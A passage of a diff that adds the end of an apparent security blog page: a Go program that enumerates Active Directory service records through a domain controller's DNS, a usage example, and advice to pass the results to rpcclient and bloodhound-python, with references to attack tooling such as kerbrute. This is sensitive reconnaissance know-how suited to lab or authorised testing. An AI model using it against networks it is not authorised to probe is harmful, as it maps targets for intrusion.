+		fmt.Printf(&#34;[+] _%s._%s.%s -&gt; %s:%d (priority %d weight %d)\n&#34;,
+			service, proto, domain, r.Target, r.Port, r.Priority, r.Weight)
+	}
+}
+
+func main() {
+	if len(os.Args) != 3 {
+		fmt.Fprintf(os.Stderr, &#34;usage: %s &lt;domain&gt; &lt;dc-ip&gt;\n&#34;, os.Args[0])
+		os.Exit(2)
+	}
+
+	domain, dc := os.Args[1], os.Args[2]
+
+	resolver := &amp;net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, _ string) (net.Conn, error) {
+			d := net.Dialer{Timeout: 5 * time.Second}
+			return d.DialContext(ctx, &#34;udp&#34;, net.JoinHostPort(dc, &#34;53&#34;))
+		},
+	}
+
+	for _, service := range []string{&#34;ldap&#34;, &#34;kerberos&#34;, &#34;kpasswd&#34;, &#34;gc&#34;} {
+		lookup(resolver, service, &#34;tcp&#34;, domain)
+	}
+}
+						</pre>
+						<p>
+							Run it as
+							<code>go run srvscan.go corp.local 10.0.0.1</code>
+							, compare the discovered hostnames with the
+							<code>_ldap._tcp.pdc._msdcs</code>
+							record, then feed those hostnames into
+							<code>rpcclient</code>
+							and
+							<code>bloodhound-python</code>
+							.
+						</p>
+					</section>
+					<section>
+						<h3 id="references">References</h3>
+						<ul>
+							<li><a class="icon-website" href="https://datatracker.ietf.org/doc/html/rfc2782" target="_blank">RFC 2782 - DNS SRV records</a> - SRV record format, priority, and weight</li>
+							<li><a class="icon-github" href="https://github.com/fortra/impacket" target="_blank">Impacket</a> - Python toolkit for MS- <abbr title="Remote Procedure Call">RPC</abbr> , Kerberos, and <abbr title="Lightweight Directory Access Protocol">LDAP</abbr></li>
+							<li><a class="icon-github" href="https://github.com/BloodHoundAD/BloodHound" target="_blank">BloodHound</a> - attack path mapping for Active Directory</li>
+							<li><a class="icon-github" href="https://github.com/ropnop/kerbrute" target="_blank">kerbrute</a> - user enumeration and password spraying over Kerberos</li>
+							<li><a class="icon-website" href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties" target="_blank">User Account Control flags - Microsoft Learn</a> - the bitmask values</li>
+							<li><a class="icon-github" href="https://github.com/Orange-Cyberdefense/GOAD" target="_blank">Game Of Active Directory</a> - provisioned multi-domain lab</li>
+						</ul>
+					</section>
+				</article>
+			</main>
+		</div>
+
+		<footer>
+			<div></div>
+			<div class="print-not">Made with 💔 in Germany. &copy; Cookie Engineer (https://cookie.engineer). All rights (and jokes) reserved under European Law.</div>
+			<div></div>
+		</footer>
+
+	</body>
+</html>
